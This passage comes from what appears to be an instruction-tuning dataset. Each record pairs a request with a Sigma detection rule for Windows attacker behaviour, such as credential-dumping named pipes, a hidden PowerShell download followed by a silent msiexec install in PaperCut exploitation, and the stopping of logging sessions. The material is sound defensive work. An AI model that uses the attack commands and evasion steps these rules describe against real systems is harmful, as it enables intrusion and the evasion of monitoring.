    "instruction": "Build a Sigma rule with the goal of detecting usage of bitsadmin downloading a file using an URL that contains an IP.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of bitsadmin downloading a file using an URL that contains an IP, you should monitor process creation events on Windows systems for the execution of the bitsadmin utility. Specifically, look for cases where the bitsadmin executable is initiated (either directly as 'bitsadmin.exe' or where the image path ends with '\\bitsadmin.exe'), and the command line includes parameters such as ' /transfer ', ' /create ', or ' /addfile '. Additionally, scrutinize the command line for URLs containing direct IP addresses, indicated by '://1' through '://9', but excluding the specific use case of '://7-' which is related to accessing the legitimate 7-Zip website. Keep track of the complete CommandLine and ParentCommandLine for further analysis. This approach is critical for identifying attempts to misuse bitsadmin for downloading malicious files directly using IP addresses, which is a common tactic in various types of cyber attacks, enhancing your security posture against such threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_extension:\n        CommandLine|contains:\n            - '://1'\n            - '://2'\n            - '://3'\n            - '://4'\n            - '://5'\n            - '://6'\n            - '://7'\n            - '://8'\n            - '://9'\n    filter_seven_zip:\n        CommandLine|contains: '://7-' # For https://7-zip.org/\n    condition: all of selection_* and not 1 of filter_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_extension:\n        CommandLine|contains:\n            - '://1'\n            - '://2'\n            - '://3'\n            - '://4'\n            - '://5'\n            - '://6'\n            - '://7'\n            - '://8'\n            - '://9'\n    filter_seven_zip:\n        CommandLine|contains: '://7-' # For https://7-zip.org/\n    condition: all of selection_* and not 1 of filter_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of bitsadmin downloading a file using an URL that contains an IP",
      "answer": "In order to detect usage of bitsadmin downloading a file using an URL that contains an IP, you should monitor process creation events on Windows systems for the execution of the bitsadmin utility. Specifically, look for cases where the bitsadmin executable is initiated (either directly as 'bitsadmin.exe' or where the image path ends with '\\bitsadmin.exe'), and the command line includes parameters such as ' /transfer ', ' /create ', or ' /addfile '. Additionally, scrutinize the command line for URLs containing direct IP addresses, indicated by '://1' through '://9', but excluding the specific use case of '://7-' which is related to accessing the legitimate 7-Zip website. Keep track of the complete CommandLine and ParentCommandLine for further analysis. This approach is critical for identifying attempts to misuse bitsadmin for downloading malicious files directly using IP addresses, which is a common tactic in various types of cyber attacks, enhancing your security posture against such threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting well-known credential dumping tools execution via specific named pipes.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect well-known credential dumping tools execution via specific named pipes, you should monitor Windows named pipe creation events. Specifically, look for the creation of named pipes that contain the strings '\\lsadump', '\\cachedump', or '\\wceservicepipe'. These particular named pipe names are commonly associated with credential dumping activities, which are tactics employed to retrieve authentication credentials from Windows systems. Monitoring for these events requires configuring logging for Named Pipe Events in Sysmon, specifically Event ID 17 (Pipe Created) and Event ID 18 (Pipe Connected). It's essential to ensure that your Sysmon configuration is set to log these types of events, which is a configuration that can be found in popular Sysmon configurations available online. However, organizations should verify that their current configuration supports this level of monitoring.\n\nThe detection of such activities is critical as it directly relates to the tactics and techniques of Credential Access through Credential Dumping. Be aware that there could be legitimate uses of tools that interact with named pipes in this manner, such as administrators using tools for password recovery. These instances are considered false positives in the context of this monitoring strategy. Given the critical level of this rule, it's important to investigate and differentiate between malicious activities and legitimate administrative actions to avoid unnecessary alarm.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|contains:\n            - '\\lsadump'\n            - '\\cachedump'\n            - '\\wceservicepipe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|contains:\n            - '\\lsadump'\n            - '\\cachedump'\n            - '\\wceservicepipe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: critical\n",
      "question": "well-known credential dumping tools execution via specific named pipes",
      "answer": "In order to detect well-known credential dumping tools execution via specific named pipes, you should monitor Windows named pipe creation events. Specifically, look for the creation of named pipes that contain the strings '\\lsadump', '\\cachedump', or '\\wceservicepipe'. These particular named pipe names are commonly associated with credential dumping activities, which are tactics employed to retrieve authentication credentials from Windows systems. Monitoring for these events requires configuring logging for Named Pipe Events in Sysmon, specifically Event ID 17 (Pipe Created) and Event ID 18 (Pipe Connected). It's essential to ensure that your Sysmon configuration is set to log these types of events, which is a configuration that can be found in popular Sysmon configurations available online. However, organizations should verify that their current configuration supports this level of monitoring.\n\nThe detection of such activities is critical as it directly relates to the tactics and techniques of Credential Access through Credential Dumping. Be aware that there could be legitimate uses of tools that interact with named pipes in this manner, such as administrators using tools for password recovery. These instances are considered false positives in the context of this monitoring strategy. Given the critical level of this rule, it's important to investigate and differentiate between malicious activities and legitimate administrative actions to avoid unnecessary alarm."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling Windows Defender PUA protection.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling Windows Defender PUA protection, you should: Monitor registry setting changes on Windows systems, specifically focusing on the category of registry_set. Look for events where the EventType is SetValue, indicating that a registry value has been modified. The primary target to watch is modifications to the registry key path that includes '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'. The specific alteration to be alert for is when the Details of the modification show a DWORD value set to '0x00000000', which effectively disables the Windows Defender's potentially unwanted application (PUA) protection feature. This detection strategy is critical as it helps identify attempts to weaken the security of a system by turning off PUA protection, which is a common tactic used by attackers to avoid detection. While monitoring for this behavior, be aware that false positive occurrences are unknown, indicating that any detection should be taken seriously and investigated. The significance of such monitoring is underscored by its high level of importance in maintaining system security against tactics and techniques that involve the disabling of protective measures meant to block potentially harmful software.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "disabling Windows Defender PUA protection",
      "answer": "In order to detect disabling Windows Defender PUA protection, you should: Monitor registry setting changes on Windows systems, specifically focusing on the category of registry_set. Look for events where the EventType is SetValue, indicating that a registry value has been modified. The primary target to watch is modifications to the registry key path that includes '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'. The specific alteration to be alert for is when the Details of the modification show a DWORD value set to '0x00000000', which effectively disables the Windows Defender's potentially unwanted application (PUA) protection feature. This detection strategy is critical as it helps identify attempts to weaken the security of a system by turning off PUA protection, which is a common tactic used by attackers to avoid detection. While monitoring for this behavior, be aware that false positive occurrences are unknown, indicating that any detection should be taken seriously and investigated. The significance of such monitoring is underscored by its high level of importance in maintaining system security against tactics and techniques that involve the disabling of protective measures meant to block potentially harmful software."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deletion of files with extensions often used for backup files. Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect deletion of files with extensions often used for backup files, as adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery, you should: Monitor Windows file deletion events for actions initiated by command line interfaces such as cmd.exe, PowerShell (powershell.exe or pwsh.exe), Windows Terminal (wt.exe), and DLL or application loading programs like rundll32.exe and regsvr32.exe. Specifically, pay attention to the deletion of files with extensions that are commonly associated with backups and system recovery, including .VHD, .bac, .bak, .wbcat, .bkf, .set, .win, and .dsk. Any occurrence of these file deletion activities should be investigated to ensure they are not part of a malicious attempt to hinder system recovery efforts. Be aware that there can be legitimate reasons for these actions, thus it\u2019s crucial to differentiate between genuine system or user-initiated processes and potentially harmful activities. This monitoring approach is of medium importance level and aligns with tactics to disrupt system recovery processes by eliminating backup or system recovery files.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_delete\ndetection:\n    selection:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wt.exe'\n            - '\\rundll32.exe'\n            - '\\regsvr32.exe'\n        TargetFilename|endswith:\n            - '.VHD'\n            - '.bac'\n            - '.bak'\n            - '.wbcat'\n            - '.bkf'\n            - '.set'\n            - '.win'\n            - '.dsk'\n    condition: selection\nfalsepositives:\n    - Legitime usage\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_delete\ndetection:\n    selection:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wt.exe'\n            - '\\rundll32.exe'\n            - '\\regsvr32.exe'\n        TargetFilename|endswith:\n            - '.VHD'\n            - '.bac'\n            - '.bak'\n            - '.wbcat'\n            - '.bkf'\n            - '.set'\n            - '.win'\n            - '.dsk'\n    condition: selection\nfalsepositives:\n    - Legitime usage\nlevel: medium\n",
      "question": "deletion of files with extensions often used for backup files. Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.",
      "answer": "In order to detect deletion of files with extensions often used for backup files, as adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery, you should: Monitor Windows file deletion events for actions initiated by command line interfaces such as cmd.exe, PowerShell (powershell.exe or pwsh.exe), Windows Terminal (wt.exe), and DLL or application loading programs like rundll32.exe and regsvr32.exe. Specifically, pay attention to the deletion of files with extensions that are commonly associated with backups and system recovery, including .VHD, .bac, .bak, .wbcat, .bkf, .set, .win, and .dsk. Any occurrence of these file deletion activities should be investigated to ensure they are not part of a malicious attempt to hinder system recovery efforts. Be aware that there can be legitimate reasons for these actions, thus it\u2019s crucial to differentiate between genuine system or user-initiated processes and potentially harmful activities. This monitoring approach is of medium importance level and aligns with tactics to disrupt system recovery processes by eliminating backup or system recovery files."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the AgentExecutor.exe binary, which can be abused as a LOLBIN to execute PowerShell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by the 6th positional argument, you should: focus on monitoring the creation of processes on Windows machines. Specifically, keep an eye out for instances where the AgentExecutor.exe file is initiated. This can typically be identified through the image name 'AgentExecutor.exe' or the original file name being exactly 'AgentExecutor.exe'. Additionally, it's crucial to monitor command lines associated with this process for specific flags including ' -powershell' or ' -remediationScript'. These flags indicate that PowerShell may be used, potentially with settings that circumvent execution policy restrictions. This behavior signals a potential security risk, especially if the PowerShell script is executed with a policy set to bypass, which is often a tactic used by malicious actors to execute scripts without triggering security measures. It's important to differentiate between legitimate and suspicious uses of this executable, particularly in environments where Intune management is used, to minimize false positives. Focus on the command lines used with AgentExecutor.exe to distinguish between regular administrative tasks and potentially harmful activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image: '\\AgentExecutor.exe'\n        - OriginalFileName: 'AgentExecutor.exe'\n    selection_cli:\n        # Example:\n        #   AgentExecutor.exe -powershell [scriptPath] [outputFilePath] [errorFilePath] [timeoutFilePath] [timeoutSeconds] [powershellPath] [enforceSignatureCheck] [runAs32BitOn64]\n        # Note:\n        #   - If [timeoutSeconds] is NULL then it defaults to 60000\n        #   - If [enforceSignatureCheck] is:\n        #       - \"NULL\" or \"1\" then a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy allsigned -file \"\n        #       - Else a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy bypass -file \"\n        #   - [powershellPath] is always concatendated to \"powershell.exe\"\n        CommandLine|contains:\n            - ' -powershell' # Also covers the \"-powershellDetection\" flag\n            - ' -remediationScript'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use via Intune management. You exclude script paths and names to reduce FP rate\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image: '\\AgentExecutor.exe'\n        - OriginalFileName: 'AgentExecutor.exe'\n    selection_cli:\n        # Example:\n        #   AgentExecutor.exe -powershell [scriptPath] [outputFilePath] [errorFilePath] [timeoutFilePath] [timeoutSeconds] [powershellPath] [enforceSignatureCheck] [runAs32BitOn64]\n        # Note:\n        #   - If [timeoutSeconds] is NULL then it defaults to 60000\n        #   - If [enforceSignatureCheck] is:\n        #       - \"NULL\" or \"1\" then a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy allsigned -file \"\n        #       - Else a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy bypass -file \"\n        #   - [powershellPath] is always concatendated to \"powershell.exe\"\n        CommandLine|contains:\n            - ' -powershell' # Also covers the \"-powershellDetection\" flag\n            - ' -remediationScript'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use via Intune management. You exclude script paths and names to reduce FP rate\nlevel: medium\n",
      "question": "execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument",
      "answer": "In order to detect execution of the AgentExecutor.exe binary, which can be abused as a LOLBIN to execute PowerShell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by the 6th positional argument, you should: focus on monitoring the creation of processes on Windows machines. Specifically, keep an eye out for instances where the AgentExecutor.exe file is initiated. This can typically be identified through the image name 'AgentExecutor.exe' or the original file name being exactly 'AgentExecutor.exe'. Additionally, it's crucial to monitor command lines associated with this process for specific flags including ' -powershell' or ' -remediationScript'. These flags indicate that PowerShell may be used, potentially with settings that circumvent execution policy restrictions. This behavior signals a potential security risk, especially if the PowerShell script is executed with a policy set to bypass, which is often a tactic used by malicious actors to execute scripts without triggering security measures. It's important to differentiate between legitimate and suspicious uses of this executable, particularly in environments where Intune management is used, to minimize false positives. Focus on the command lines used with AgentExecutor.exe to distinguish between regular administrative tasks and potentially harmful activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect malicious GPO modifications can be used to implement many other malicious behaviors..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect malicious GPO modifications can be used to implement many other malicious behaviors, you should: Monitor Windows PowerShell script activity for specific script block text that involves references to the Windows Group Policy Objects (GPO) settings. This involves checking for any script content that contains access or modifications to registry paths related to system policies, such as \"\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\". Specifically, watch out for the manipulation of registry keys associated with Group Policy refresh intervals (`GroupPolicyRefreshTimeDC`, `GroupPolicyRefreshTimeOffsetDC`, `GroupPolicyRefreshTime`, `GroupPolicyRefreshTimeOffset`), and settings that pertain to Windows Defender SmartScreen (`EnableSmartScreen`, `ShellSmartScreenLevel`). These modifications can indicate attempts to alter system policies or security settings in a way that could undermine system security or assist in further malicious activities. The detection process hinges on having Script Block Logging enabled in Windows PowerShell, allowing for comprehensive tracking of script execution. Be mindful of legitimate alterations to these settings, which can result in false positives. The threat level associated with this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_path:\n        ScriptBlockText|contains: \\SOFTWARE\\Policies\\Microsoft\\Windows\\System\n    selection_key:\n        ScriptBlockText|contains:\n            - GroupPolicyRefreshTimeDC\n            - GroupPolicyRefreshTimeOffsetDC\n            - GroupPolicyRefreshTime\n            - GroupPolicyRefreshTimeOffset\n            - EnableSmartScreen\n            - ShellSmartScreenLevel\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_path:\n        ScriptBlockText|contains: \\SOFTWARE\\Policies\\Microsoft\\Windows\\System\n    selection_key:\n        ScriptBlockText|contains:\n            - GroupPolicyRefreshTimeDC\n            - GroupPolicyRefreshTimeOffsetDC\n            - GroupPolicyRefreshTime\n            - GroupPolicyRefreshTimeOffset\n            - EnableSmartScreen\n            - ShellSmartScreenLevel\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "Detect malicious GPO modifications can be used to implement many other malicious behaviors.",
      "answer": "In order to detect malicious GPO modifications can be used to implement many other malicious behaviors, you should: Monitor Windows PowerShell script activity for specific script block text that involves references to the Windows Group Policy Objects (GPO) settings. This involves checking for any script content that contains access or modifications to registry paths related to system policies, such as \"\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\". Specifically, watch out for the manipulation of registry keys associated with Group Policy refresh intervals (`GroupPolicyRefreshTimeDC`, `GroupPolicyRefreshTimeOffsetDC`, `GroupPolicyRefreshTime`, `GroupPolicyRefreshTimeOffset`), and settings that pertain to Windows Defender SmartScreen (`EnableSmartScreen`, `ShellSmartScreenLevel`). These modifications can indicate attempts to alter system policies or security settings in a way that could undermine system security or assist in further malicious activities. The detection process hinges on having Script Block Logging enabled in Windows PowerShell, allowing for comprehensive tracking of script execution. Be mindful of legitimate alterations to these settings, which can result in false positives. The threat level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of Outlook security setting to allow unprompted execution of macros..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the modification of Outlook security setting to allow unprompted execution of macros, you should: Monitor registry setting modifications on Windows systems, specifically focusing on events where a value change occurs (`SetValue` event type). The key area of interest is within the registry path ending with `\\Outlook\\Security\\Level`. Significant attention should be given to modifications where the details of the change include '0x00000001', which indicates that the security setting has been altered to enable all Macros. Such a configuration adjustment is essential to identify because it lowers the security threshold, potentially allowing malicious macros to run without any prompts to the user, thus posing a high risk. False positives for this kind of monitoring are deemed unlikely, indicating the specificity of the detection criteria is quite high and closely associated with malicious intent or significant security policy alterations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Outlook\\Security\\Level'\n        Details|contains: '0x00000001' # Enable all Macros\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Outlook\\Security\\Level'\n        Details|contains: '0x00000001' # Enable all Macros\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "modification of Outlook security setting to allow unprompted execution of macros.",
      "answer": "In order to detect the modification of Outlook security setting to allow unprompted execution of macros, you should: Monitor registry setting modifications on Windows systems, specifically focusing on events where a value change occurs (`SetValue` event type). The key area of interest is within the registry path ending with `\\Outlook\\Security\\Level`. Significant attention should be given to modifications where the details of the change include '0x00000001', which indicates that the security setting has been altered to enable all Macros. Such a configuration adjustment is essential to identify because it lowers the security threshold, potentially allowing malicious macros to run without any prompts to the user, thus posing a high risk. False positives for this kind of monitoring are deemed unlikely, indicating the specificity of the detection criteria is quite high and closely associated with malicious intent or significant security policy alterations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation indicators related to PaperCut MF/NG Exploitation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation indicators related to PaperCut MF/NG Exploitation, you should: Monitor Windows process creation logs for execution patterns that might indicate an attack attempt. Specifically, look out for processes initiated with command lines that include a combination of specific flags and parameters. The first pattern to be wary of involves a command line that contains a call to 'powershell' with the switches '/c', indicating the execution of a command, and '-nop -w hidden', which serves to suppress Powershell scripting engine notifications and run the window in hidden mode. Additionally, this pattern includes 'Invoke-WebRequest', suggesting a web request is being made, combined with the downloading of a file named 'setup.msi' to the local system using '-OutFile'. The second pattern involves the use of 'msiexec ', a Windows installer component, followed by '/i ' to install the 'setup.msi' package quietly ('/qn '), with a parameter 'IntegratorLogin=fimaribahundq', which might be specific to the exploitation process. Such activities, especially with the presence of the 'setup.msi' file and specific command-line usage, are considered highly suspicious and unlikely to be false positives in the context of monitoring for PaperCut MF/NG exploitation attempts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - ' /c '\n            - 'powershell'\n            - '-nop -w hidden'\n            - 'Invoke-WebRequest'\n            - 'setup.msi'\n            - '-OutFile'\n    selection_2:\n        CommandLine|contains|all:\n            - 'msiexec '\n            - '/i '\n            - 'setup.msi '\n            - '/qn '\n            - 'IntegratorLogin=fimaribahundq'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - ' /c '\n            - 'powershell'\n            - '-nop -w hidden'\n            - 'Invoke-WebRequest'\n            - 'setup.msi'\n            - '-OutFile'\n    selection_2:\n        CommandLine|contains|all:\n            - 'msiexec '\n            - '/i '\n            - 'setup.msi '\n            - '/qn '\n            - 'IntegratorLogin=fimaribahundq'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "exploitation indicators related to PaperCut MF/NG Exploitation",
      "answer": "In order to detect exploitation indicators related to PaperCut MF/NG Exploitation, you should: Monitor Windows process creation logs for execution patterns that might indicate an attack attempt. Specifically, look out for processes initiated with command lines that include a combination of specific flags and parameters. The first pattern to be wary of involves a command line that contains a call to 'powershell' with the switches '/c', indicating the execution of a command, and '-nop -w hidden', which serves to suppress Powershell scripting engine notifications and run the window in hidden mode. Additionally, this pattern includes 'Invoke-WebRequest', suggesting a web request is being made, combined with the downloading of a file named 'setup.msi' to the local system using '-OutFile'. The second pattern involves the use of 'msiexec ', a Windows installer component, followed by '/i ' to install the 'setup.msi' package quietly ('/qn '), with a parameter 'IntegratorLogin=fimaribahundq', which might be specific to the exploitation process. Such activities, especially with the presence of the 'setup.msi' file and specific command-line usage, are considered highly suspicious and unlikely to be false positives in the context of monitoring for PaperCut MF/NG exploitation attempts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting using register-cimprovider.exe to execute arbitrary dll file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect using register-cimprovider.exe to execute arbitrary dll file, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for the execution of 'register-cimprovider.exe' where the command line arguments include both '-path' and 'dll', indicating an attempt to execute an arbitrary DLL file. These detections are essential for identifying potentially malicious activities related to the execution of unauthorized code. It's important to log the command line parameters involved in such executions to aid in investigation. However, be aware that there might be legitimate uses that could trigger false positives, although they are unknown; therefore, a medium level of attention should be paid to such events.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "using register-cimprovider.exe to execute arbitrary dll file.",
      "answer": "In order to detect using register-cimprovider.exe to execute arbitrary dll file, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for the execution of 'register-cimprovider.exe' where the command line arguments include both '-path' and 'dll', indicating an attempt to execute an arbitrary DLL file. These detections are essential for identifying potentially malicious activities related to the execution of unauthorized code. It's important to log the command line parameters involved in such executions to aid in investigation. However, be aware that there might be legitimate uses that could trigger false positives, although they are unknown; therefore, a medium level of attention should be paid to such events."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of \"logman\" utility in order to disable or delete Windows trace sessions.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of \"logman\" utility in order to disable or delete Windows trace sessions, you should: Monitor process creation events in Windows environments for the execution of \"logman.exe\". This detection focuses on instances where \"logman.exe\" is executed, specifically when its command line includes actions to \"stop\" or \"delete\" certain processes or services. Furthermore, it is important to watch for command-line invocations that attempt to manipulate or deactivate Windows trace sessions, especially those related to the Circular Kernel Context Logger, any event logs prefixed with \"EventLog-\", \"SYSMON TRACE\", or the \"SysmonDnsEtwSession\". The rule identifies these activities as potentially malicious due to their nature of disrupting trace and logging mechanisms which are vital for auditing and forensic analysis. It is worth noting that while this rule aims to capture malicious activity, there may be instances where legitimate administrative actions or installer tools perform similar operations. Therefore, such benign activities might trigger alerts and should be considered as possible false positives. The significance of detecting these actions is high, given their potential use in evading detection or hindering security investigations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\logman.exe'\n        - OriginalFileName: 'Logman.exe'\n    selection_action:\n        CommandLine|contains:\n            - 'stop '\n            - 'delete '\n    selection_service:\n        CommandLine|contains:\n            - 'Circular Kernel Context Logger'\n            - 'EventLog-' # Cover multiple traces starting with EventLog-*\n            - 'SYSMON TRACE'\n            - 'SysmonDnsEtwSession'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate deactivation by administrative staff\n    - Installer tools that disable services, e.g. before log collection agent installation\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\logman.exe'\n        - OriginalFileName: 'Logman.exe'\n    selection_action:\n        CommandLine|contains:\n            - 'stop '\n            - 'delete '\n    selection_service:\n        CommandLine|contains:\n            - 'Circular Kernel Context Logger'\n            - 'EventLog-' # Cover multiple traces starting with EventLog-*\n            - 'SYSMON TRACE'\n            - 'SysmonDnsEtwSession'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate deactivation by administrative staff\n    - Installer tools that disable services, e.g. before log collection agent installation\nlevel: high\n",
      "question": "execution of \"logman\" utility in order to disable or delete Windows trace sessions",
